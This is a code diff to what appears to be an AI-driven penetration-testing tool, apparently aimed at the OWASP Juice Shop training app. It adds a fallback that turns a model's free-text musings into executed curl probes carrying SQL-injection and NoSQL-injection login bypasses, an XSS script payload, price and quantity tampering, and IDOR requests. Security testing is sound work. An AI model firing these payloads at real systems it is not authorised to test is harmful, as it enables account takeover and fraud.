@@ -399,6 +399,106 @@ async function reconPhase(huntId, target) {
   return recon;
 }
 
+/**
+ * HUMAN-LIKE TEST EXTRACTION: When the model thinks like a human ("Test: ...",
+ * "What if I...", "I wonder if...") instead of producing JSON, extract the
+ * test INTENTIONS and construct executable commands.
+ *
+ * A human assistant hears the idea and figures out HOW to test it.
+ * This is not a checklist — it's understanding intent and acting on it.
+ */
+function extractTestsFromThinking(reply, recon, target) {
+  const tests = [];
+  const baseUrl = target.replace(/\/$/, '');
+  const endpoints = recon.endpoints || [];
+
+  // Find login endpoints for auth tests
+  const loginEp = endpoints.find((ep) => /login|auth|signin/i.test(ep)) || '/rest/user/login';
+  // Find basket/cart endpoints for business logic tests
+  const basketEp = endpoints.find((ep) => /basket|cart/i.test(ep)) || '/rest/basket';
+  // Find product endpoints
+  const productEp = endpoints.find((ep) => /product/i.test(ep)) || '/rest/products';
+
+  const text = String(reply).toLowerCase();
+
+  // Pattern 1: "Test: <name> — <description>"
+  const testPattern = /test:\s*([^—\n]+?)(?:—|-)\s*([^\n]+)/gi;
+  let m;
+  while ((m = testPattern.exec(reply)) !== null && tests.length < 3) {
+    const testName = m[1].trim();
+    const description = m[2].trim();
+    const lower = (testName + ' ' + description).toLowerCase();
+
+    let command = null;
+    let why = description.slice(0, 200);
+
+    // SQLi on login
+    if (/sql.*inject|login.*bypass|auth.*bypass/i.test(lower) && /login|auth/i.test(lower)) {
+      command = `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`;
+    }
+    // NoSQL injection
+    else if (/nosql/i.test(lower)) {
+      command = `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 2000`;
+    }
+    // XSS
+    else if (/xss|cross.*site|script.*inject/i.test(lower)) {
+      const searchEp = endpoints.find((ep) => /search/i.test(ep)) || '/rest/products/search';
+      command = `curl -sk "${baseUrl}${searchEp}?q=<script>alert(1)</script>" | head -c 2000`;
+    }
+    // Price manipulation
+    else if (/price.*manipulat|manipulat.*price|cost.*change/i.test(lower)) {
+      command = `curl -sk "${baseUrl}${basketEp}" -d 'quantity=1' -d 'price=0.01' | head -c 2000`;
+    }
+    // Quantity manipulation
+    else if (/quantit/i.test(lower)) {
+      command = `curl -sk "${baseUrl}${basketEp}" -d 'quantity=0' | head -c 2000; echo "---NEG---"; curl -sk "${baseUrl}${basketEp}" -d 'quantity=-1' | head -c 2000`;
+    }
+    // IDOR / object ID
+    else if (/idor|object.*id|someone.*else|other.*user/i.test(lower)) {
+      command = `curl -sk "${baseUrl}${basketEp}/1" | head -c 2000; echo "---2---"; curl -sk "${baseUrl}${basketEp}/2" | head -c 2000`;
+    }
+    // Empty basket checkout
+    else if (/empty.*basket|basket.*empty|checkout.*empty/i.test(lower)) {
+      command = `curl -sk -X POST "${baseUrl}/rest/basket/checkout" -H "Content-Type: application/json" -d '{}' | head -c 2000`;
+    }
+    // Generic: try to construct a probe based on keywords
+    else if (/product.*id|product/i.test(lower)) {
+      command = `curl -sk "${baseUrl}${productEp}/1" | head -c 2000`;
+    }
+
+    if (command) {
+      tests.push({ test: testName.slice(0, 100), command, why, hypothesis: `Testing: ${testName.slice(0, 100)}` });
+    }
+  }
+
+  // Pattern 2: "What if I..." / "I wonder if..." — curiosity-driven tests
+  const wonderPattern = /(?:what if|i wonder if|can i|is it possible to)\s+([^\n?.]+)/gi;
+  while ((m = wonderPattern.exec(reply)) !== null && tests.length < 3) {
+    const idea = m[1].trim();
+    const lower = idea.toLowerCase();
+
+    let command = null;
+    if (/checkout.*empty|empty.*basket/i.test(lower)) {
+      command = `curl -sk -X POST "${baseUrl}/rest/basket/checkout" -H "Content-Type: application/json" -d '{}' | head -c 2000`;
+    } else if (/price|cheaper|free/i.test(lower)) {
+      command = `curl -sk "${baseUrl}${basketEp}" | head -c 2000`;
+    } else if (/other.*user|someone.*else|idor/i.test(lower)) {
+      command = `curl -sk "${baseUrl}${basketEp}/1" | head -c 1000; echo "---"; curl -sk "${baseUrl}${basketEp}/999" | head -c 1000`;
+    }
+
+    if (command) {
+      tests.push({
+        test: `Curiosity: ${idea.slice(0, 80)}`,
+        command,
+        why: `Model wondered: "${idea.slice(0, 150)}"`,
+        hypothesis: 'Curiosity-driven probe',
+      });
+    }
+  }
+
+  return tests;
+}
+
 /** Phase 2+: Bedrock picks the next test; we execute and verify. */
 async function agentIteration(huntId, target, recon, findings, iteration, playbook) {
   const confirmed = findings.filter((f) => f.verified);
@@ -563,8 +663,18 @@ async function agentIteration(huntId, target, recon, findings, iteration, playbo
     return { aiOk: false, best: null, failKind: 'error' };
   }
   if (!plans.length) {
-    think(huntId, 'Model replied but produced no usable plan — skipping to next.');
-    return { aiOk: false, best: null, failKind: 'bad_output' };
+    // HUMAN-LIKE FALLBACK: The model thinks like a human ("Test: ...", "What if...",
+    // "I wonder...") but doesn't always produce JSON. Extract test INTENTIONS from
+    // the natural language thinking and construct executable commands.
+    // A human assistant would do this: hear the idea, figure out how to test it.
+    const extracted = extractTestsFromThinking(reply, recon, target);
+    if (extracted.length) {
+      think(huntId, `Extracted ${extracted.length} test(s) from natural thinking — executing.`);
+      plans = extracted;
+    } else {
+      think(huntId, 'Model replied but produced no usable plan — skipping to next.');
+      return { aiOk: false, best: null, failKind: 'bad_output' };
+    }
   }
 
   // MANDATORY AUTH TESTS: If recon found login/auth endpoints and the model's
